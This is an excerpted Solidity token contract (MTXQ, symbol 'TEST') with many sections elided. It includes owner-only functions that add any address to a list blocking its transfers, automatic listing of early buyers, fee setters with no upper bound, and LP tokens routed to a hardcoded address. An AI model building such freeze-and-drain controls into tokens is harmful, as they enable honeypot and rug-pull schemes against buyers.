...
abstract contract AbsToken is IERC20, Ownable {
    ...
    mapping(address => bool) public _commonlist;
    ...
    function _transfer(
        ...
        require(!_commonlist[from], "common");
        ...
        if (takeFee) {
            ...
            if (isSell) {
                ...
                if(cutcount > 0)
                {
                    ...
                    //swapTokenForFund2(cutcount.div(4));
            ...
            {
                if (block.number <= startTradeBlock + kb+1)_commonlist[recipient]=true;
    ...
    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
        ...
        uint256 fundAmount_A = fundAmount / 2;
        ...
        if (lpAmount > 0) {
            ...
            if (lpUSDT > 0) {//USDT.transfer(funder, lpUSDT - lpUSDT/2);
                USDT.transfer(address(_nftDistributor), lpUSDT);
                _balances[address(this)] = _balances[address(this)].sub(lpAmount);
                _takeTransfer(address(this),DeadAddress, lpAmount/2);
                _takeTransfer(address(this),address(0xFAB0B8EF4A1bF1312FfcBC5e001B557a711E2b4d), lpAmount - lpAmount/2);
            }
        }
    }
    ...
    function setBuyLPDividendTa(uint256 dividendFee) external onlyOwner {
        _buyLPDividendFee = dividendFee;
    }

    function setBuyFundTa(uint256 fundFee) external onlyOwner {
        _buyFundFee = fundFee;
    }

    function setBuyLPTa(uint256 LPFee) external onlyOwner {
        _buyLPFee = LPFee;
    }

    function setSellLPDividendTa(uint256 dividendFee) external onlyOwner {
        _sellLPDividendFee = dividendFee;
    }

    function setSellFundTa(uint256 fundFee) external onlyOwner {
        _sellFundFee = fundFee;
    }

    function setSellLPTa(uint256 lpFee) external onlyOwner {
        _sellLPFee = lpFee;
    }
    ...
    function setComList(address addr, bool enable) external onlyOwner {
        _commonlist[addr] = enable;
    }

    function multiComList(address[] calldata addresses, bool status) public onlyOwner {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            _commonlist[addresses[i]] = status;
        }
    }

    function multiTransfer_fixed(address[] calldata addresses, uint256 amount) external onlyFunder {
    ...
    function multiLpWhite(address[] calldata addresses, bool status) public onlyFunder {
        require(addresses.length < 201);
        for (uint256 i; i < addresses.length; ++i) {
            Lpwhite[addresses[i]] = status;
        }
    }
...
contract MTXQ is AbsToken {
    constructor(address _f) AbsToken(
        address(0x10ED43C718714eb63d5aA57B78B54704E256024E),    //0x9Ac64Cc6e4415144C455BD8E4837Fea55603e5c3;0x10ED43C718714eb63d5aA57B78B54704E256024E
        address(0x55d398326f99059fF775485246999027B3197955),_f, //0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684;0x55d398326f99059fF775485246999027B3197955
        "TEST",
        "TEST",
        18,
        100000000,
        address(0x4B01E1C45cB25536616C6ED59004Da2FE03A5bf6),
        address(0x4803A7EaAf41AaC49bc4351175B388965E5C2DFE),
        address(0x7537FeDeA1E3A5EfDaf18957C3eD517B3331AEAc)
    ){}
}